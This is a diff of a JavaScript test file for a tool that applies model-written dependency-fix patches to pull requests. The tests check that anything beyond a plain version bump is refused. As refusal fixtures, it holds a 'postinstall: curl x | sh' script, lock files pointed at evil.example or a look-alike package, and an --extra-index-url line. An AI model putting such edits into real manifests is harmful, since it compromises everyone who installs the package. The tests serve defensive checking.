@@ -110,7 +110,7 @@ function commitAll(repo, message) {
 }
 
 // A repository at a head commit, and a patch the model's edits make against it.
-function repoWithPatch(t, edit, { renames = false } = {}) {
+function repoWithPatch(t, edit, { renames = false, head: seed = () => {} } = {}) {
   const repo = scratch(t);
   git(repo, ["init", "-q", "-b", "main"]);
   git(repo, ["config", "user.email", "t@example.com"]);
@@ -119,6 +119,7 @@ function repoWithPatch(t, edit, { renames = false } = {}) {
   writeFileSync(join(repo, "scripts/x.sh"), "#!/bin/sh\nfoo=1\n");
   writeFileSync(join(repo, "README.md"), "# r\n");
   writeFileSync(join(repo, "notes.md"), "notes\n");
+  seed(repo);
   const head = commitAll(repo, "head");
   edit(repo);
   git(repo, ["add", "-A"]);
@@ -416,39 +417,180 @@ test("a fix-ci patch of 300 files pushes with 307 API calls, and one of 301 is r
   assert.deepEqual(refused.calls, []);
 });
 
-test("requires dependency-verdict: fix refuses a patch without that verdict and applies one with it", async (t) => {
-  const fix = repoWithPatch(t, (repo) => writeFileSync(join(repo, "package.json"), "{}\n"));
-  const without = fakeApi(fix.repo, fix.head);
-  assert.deepEqual(await pushWith(fix, without, { row: row("dependency-review"), context: { dependencyVerdict: "close", dependabotConfig: [["npm", "/"]] } }), {
-    outcome: "escalate",
-    escalationReason: "patch-invalid",
+// --- the dependency-review row: a fix to manifests a Dependabot PR already has ---
+
+// A plain version bump of x from 1.0.0 to 2.0.0 and of numpy, as
+// dependency-classify.mjs's fixRefusal admits one (its own tests hold the rule).
+const PKG = (range, extra = {}) => `${JSON.stringify({ name: "p", scripts: { test: "node t.js" }, dependencies: { x: range }, ...extra }, null, 2)}\n`;
+const LOCK = (version, resolved = `https://registry.npmjs.org/x/-/x-${version}.tgz`) =>
+  `${JSON.stringify(
+    { lockfileVersion: 3, packages: { "": { dependencies: { x: `^${version}` } }, "node_modules/x": { version, resolved, integrity: `sha512-${"A".repeat(86)}==` } } },
+    null,
+    2,
+  )}\n`;
+const REQS = (version, hash) => `numpy==${version} \\\n    --hash=sha256:${hash.repeat(64)}\n    # via onnxruntime\n`;
+const PAIRS = [["npm", "/"], ["pip", "/"]];
+
+// A head that holds the manifests at the old versions, and a patch of `edit`.
+function dependencyPatch(t, edit) {
+  return repoWithPatch(t, (repo) => edit(repo), {
+    head: (repo) => {
+      writeFileSync(join(repo, "package.json"), PKG("^1.0.0"));
+      writeFileSync(join(repo, "package-lock.json"), LOCK("1.0.0"));
+      writeFileSync(join(repo, "requirements.txt"), REQS("2.5.3", "a"));
+    },
   });
-  assert.deepEqual(without.calls, []);
+}
+const bump = (repo) => {
+  writeFileSync(join(repo, "package.json"), PKG("^2.0.0"));
+  writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+  writeFileSync(join(repo, "requirements.txt"), REQS("2.5.4", "b"));
+};
+const dependencyPush = (fix, api, extra = {}) =>
+  pushWith(fix, api, { row: row("dependency-review"), context: { dependencyVerdict: "fix", dependabotConfig: PAIRS }, ...extra });
+
+test("requires dependency-verdict: fix refuses a patch without that verdict and applies one with it", async (t) => {
+  const fix = dependencyPatch(t, bump);
+  for (const verdict of ["close", "merge", "escalate", ""]) {
+    const without = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await dependencyPush(fix, without, { context: { dependencyVerdict: verdict, dependabotConfig: PAIRS } }), {
+      outcome: "escalate",
+      escalationReason: "patch-invalid",
+    }, JSON.stringify(verdict));
+    assert.deepEqual(without.calls, []);
+  }
   const withVerdict = fakeApi(fix.repo, fix.head);
-  assert.equal((await pushWith(fix, withVerdict, { row: row("dependency-review"), context: { dependencyVerdict: "fix", dependabotConfig: [["npm", "/"], ["pip", "/"]] } })).outcome, "pushed");
+  assert.equal((await dependencyPush(fix, withVerdict)).outcome, "pushed");
+  const { createCommit } = withVerdict.calls.find((call) => call.createCommit);
+  assert.equal(createCommit.message, "Fix the dependency update on feat/x [dependabot skip]\n\nLane-Activity: some-lane/some-activity\n");
 });
 
 test("dependency-manifests admits npm and pip manifests and lock files and refuses any other path", async (t) => {
-  const manifests = repoWithPatch(t, (repo) => {
-    writeFileSync(join(repo, "package.json"), "{}\n");
-    writeFileSync(join(repo, "package-lock.json"), "{}\n");
-    writeFileSync(join(repo, "requirements.txt"), "x==1\n");
-  });
-  const pushed = fakeApi(manifests.repo, manifests.head);
-  assert.equal((await pushWith(manifests, pushed, { row: row("dependency-review"), context: { dependencyVerdict: "fix", dependabotConfig: [["npm", "/"], ["pip", "/"]] } })).outcome, "pushed");
-  const code = repoWithPatch(t, (repo) => {
-    writeFileSync(join(repo, "package.json"), "{}\n");
-    writeFileSync(join(repo, "index.js"), "x\n");
+  const code = dependencyPatch(t, (repo) => {
+    bump(repo);
+    writeFileSync(join(repo, "README.md"), "# r, changed\n");
   });
   const refused = fakeApi(code.repo, code.head);
-  assert.deepEqual(await pushWith(code, refused, { row: row("dependency-review"), context: { dependencyVerdict: "fix", dependabotConfig: [["npm", "/"], ["pip", "/"]] } }), {
-    outcome: "escalate",
-    escalationReason: "patch-protected-path",
-  });
+  assert.deepEqual(await dependencyPush(code, refused), { outcome: "escalate", escalationReason: "patch-protected-path" });
   assert.deepEqual(refused.calls, []);
+  // Without the base config's pairs the predicate cannot run: it throws before any call.
+  const manifests = dependencyPatch(t, bump);
   const noConfig = fakeApi(manifests.repo, manifests.head);
-  await assert.rejects(pushWith(manifests, noConfig, { row: row("dependency-review"), context: { dependencyVerdict: "fix" } }), /dependabot\.yml/);
+  await assert.rejects(dependencyPush(manifests, noConfig, { context: { dependencyVerdict: "fix" } }), /dependabot\.yml/);
   assert.deepEqual(noConfig.calls, []);
+});
+
+// Gap 4: the content rule refuses, before any API call, a change that is in
+// scope by path but is more than a version: a script, a new file, a rename,
+// a lock resolved to another host.
+test("the dependency-version-change rule refuses a manifest change that is more than a version, before any API call", async (t) => {
+  for (const [why, edit] of [
+    ["a package.json scripts edit", (repo) => writeFileSync(join(repo, "package.json"), PKG("^2.0.0", { scripts: { test: "node t.js", postinstall: "curl x | sh" } }))],
+    ["an added manifest", (repo) => writeFileSync(join(repo, "requirements-dev.txt"), REQS("2.5.4", "b"))],
+    ["a renamed manifest", (repo) => renameSync(join(repo, "requirements.txt"), join(repo, "requirements-dev.txt"))],
+    ["a deleted lock", (repo) => rmSync(join(repo, "package-lock.json"))],
+    ["a lock resolved to another host", (repo) => writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0", "https://evil.example/x-2.0.0.tgz"))],
+    ["an executable manifest", (repo) => {
+      bump(repo);
+      chmodSync(join(repo, "package.json"), 0o755);
+    }],
+  ]) {
+    const fix = dependencyPatch(t, edit);
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await dependencyPush(fix, api), { outcome: "escalate", escalationReason: "patch-protected-path" }, why);
+    assert.deepEqual(api.calls, [], why);
+  }
+  // The same paths with only versions changed push.
+  const fix = dependencyPatch(t, bump);
+  assert.equal((await dependencyPush(fix, fakeApi(fix.repo, fix.head))).outcome, "pushed");
+});
+
+// The write runner's promote step held a dependency fix to these paths
+// before apply-patch did; its cases, ported: each path outside fix scope
+// refuses the patch beside an in-scope lock bump, before any API call.
+const SCOPE_PAIRS = [["github-actions", "/"], ["npm", "/"], ["npm", "/plugins/miro/server"], ["npm", "/.github/actions/resolve-config"], ["pip", "/plugins/animation"], ["pip", "/.github"]];
+test("dependency-manifests refuses a path outside fix scope, whatever the base config lists", async (t) => {
+  for (const path of [
+    "plugins/miro/server/src/index.js",
+    ".github/workflows/x.yml",
+    ".github/actions/resolve-config/package.json",
+    ".github/requirements-ci.txt",
+    "plugins/animation/setup.py",
+    "plugins/animation/pyproject.toml",
+    "plugins/unlisted/package.json",
+    "plugins/miro/server/sub/package.json",
+  ]) {
+    const fix = dependencyPatch(t, (repo) => {
+      writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+      mkdirSync(join(repo, dirname(path)), { recursive: true });
+      writeFileSync(join(repo, path), "x\n");
+    });
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await dependencyPush(fix, api, { context: { dependencyVerdict: "fix", dependabotConfig: SCOPE_PAIRS } }), { outcome: "escalate", escalationReason: "patch-protected-path" }, path);
+    assert.deepEqual(api.calls, [], path);
+  }
+  // The npm manifests at the listed root push.
+  const listed = dependencyPatch(t, (repo) => {
+    writeFileSync(join(repo, "package.json"), PKG("^2.0.0"));
+    writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+  });
+  assert.equal((await dependencyPush(listed, fakeApi(listed.repo, listed.head), { context: { dependencyVerdict: "fix", dependabotConfig: SCOPE_PAIRS } })).outcome, "pushed");
+  // An empty config admits nothing.
+  const fix = dependencyPatch(t, bump);
+  await assert.rejects(dependencyPush(fix, fakeApi(fix.repo, fix.head), { context: { dependencyVerdict: "fix", dependabotConfig: [] } }), /dependabot\.yml/);
+});
+
+test("the dependency-version-change rule refuses a lock repointed at another package and an index URL", async (t) => {
+  for (const [why, edit] of [
+    ["a lock repointed at another package", (repo) => writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0", "https://registry.npmjs.org/evilpkg/-/evilpkg-6.6.6.tgz"))],
+    ["an --extra-index-url line", (repo) => writeFileSync(join(repo, "requirements.txt"), `--extra-index-url https://evil.example/simple\n${REQS("2.5.4", "b")}`)],
+  ]) {
+    const fix = dependencyPatch(t, edit);
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await dependencyPush(fix, api), { outcome: "escalate", escalationReason: "patch-protected-path" }, why);
+    assert.deepEqual(api.calls, [], why);
+  }
+});
+
+test("checkRow names an unknown content rule", () => {
+  assert.throws(() => checkRow(row("dependency-review", { "content-rule": "anything" })), /unknown content rule: anything/);
+  assert.equal(RULES["dependency-review"]["content-rule"], "dependency-version-change");
+});
+
+// Gap 3: the pairs come from BASE_DIR's dependabot.yml, never the checkout's.
+test("main reads the dependency-manifests pairs from the base dependabot.yml", async (t) => {
+  const fix = dependencyPatch(t, bump);
+  const base = scratch(t);
+  mkdirSync(join(base, dirname(RULES_PATH)), { recursive: true });
+  cpSync(join(REPO_ROOT, RULES_PATH), join(base, RULES_PATH));
+  // The checkout's copy would admit the root; the base's admits it too only once written.
+  mkdirSync(join(fix.repo, ".github"), { recursive: true });
+  writeFileSync(join(fix.repo, ".github/dependabot.yml"), "updates:\n  - package-ecosystem: npm\n    directory: /\n  - package-ecosystem: pip\n    directory: /\n");
+  const out = scratch(t);
+  const env = {
+    BASE_DIR: base,
+    PATCH_PREPARE: "dependency-review",
+    GH_TOKEN: "t",
+    GITHUB_REPOSITORY: "o/r",
+    PR_NUMBER: "42",
+    HEAD_SHA: fix.head,
+    PATCH_HEAD_SHA: fix.head,
+    HEAD_REF: "feat/x",
+    LANE: "pr-unblock",
+    PATCH_ACTIVITY: "review-dependency",
+    PATCH_FILE: fix.patchFile,
+    PATCH_SHA256: fix.sum,
+    HOLD_LABELS: "[]",
+    DEPENDENCY_VERDICT: "fix",
+    SKIP_REASON_FILE: join(out, "skip"),
+    ESCALATION_REASON_FILE: join(out, "escalation"),
+    GITHUB_OUTPUT: join(out, "output"),
+  };
+  await assert.rejects(main([], env, { api: fakeApi(fix.repo, fix.head), cwd: fix.repo, gitBin: "git", log: () => {} }), /dependabot\.yml/);
+  mkdirSync(join(base, ".github"), { recursive: true });
+  writeFileSync(join(base, ".github/dependabot.yml"), "updates:\n  - package-ecosystem: npm\n    directory: /\n  - package-ecosystem: pip\n    directory: /\n");
+  await main([], env, { api: fakeApi(fix.repo, fix.head), cwd: fix.repo, gitBin: "git", log: () => {} });
+  assert.match(readFileSync(env.GITHUB_OUTPUT, "utf8"), /^commit=c{40}$/m);
 });
 
 test("Git Data API calls per applied patch are one blob per changed file plus tree, commit and ref update plus the four re-reads", async (t) => {
@@ -684,18 +826,24 @@ test("under the ci-context row a head that moved since the model job skips super
 // per pull request, so a skipped fix-docs patch would never run again. The
 // review-threads row skips, as the write runner's promote step refused a
 // branch that moved during the run: the replies judged the gated head.
-test("the ci-context and review-threads rows skip a moved head; the other PR rows keep the moved-head path", (t) => {
+test("the ci-context, review-threads and dependency-review rows skip a moved head; the other PR rows keep the moved-head path", (t) => {
   const dir = scratch(t);
   writeFileSync(join(dir, "patch.diff"), "diff --git a/x b/x\n");
   const sum = sha256("diff --git a/x b/x\n");
   const moved = { patchState: "written", patchSha256: sum, patchHeadSha: "b".repeat(40), headSha: "a".repeat(40), patchDir: dir };
-  assert.equal(RULES["ci-context"]["skip-moved-head"], true);
-  assert.equal(RULES["review-threads"]["skip-moved-head"], true);
   assert.equal(RULES.default["skip-moved-head"], false);
-  assert.equal(RULES["dependency-review"]["skip-moved-head"], undefined);
   assert.deepEqual(select({ row: row("default"), ...moved }), { proceed: true, skipReason: "", escalationReason: "" });
-  assert.deepEqual(select({ row: row("review-threads"), ...moved }), { proceed: false, skipReason: "superseded-sha", escalationReason: "" });
-  assert.deepEqual(select({ row: row("dependency-review"), ...moved }), { proceed: true, skipReason: "", escalationReason: "" });
+  for (const name of ["ci-context", "review-threads", "dependency-review"]) {
+    assert.deepEqual(select({ row: row(name), ...moved }), { proceed: false, skipReason: "superseded-sha", escalationReason: "" }, name);
+  }
+});
+
+// A Dependabot rebase between the select job and the push supersedes the fix.
+test("under the dependency-review row a head that moved since the select job skips superseded-sha before any API call", async (t) => {
+  const fix = dependencyPatch(t, bump);
+  const api = fakeApi(fix.repo, fix.head);
+  assert.deepEqual(await dependencyPush(fix, api, { patchHeadSha: "b".repeat(40) }), { outcome: "superseded" });
+  assert.deepEqual(api.calls, []);
 });
 
 test("under the review-threads row a head that moved since the model job skips superseded-sha before any API call", async (t) => {
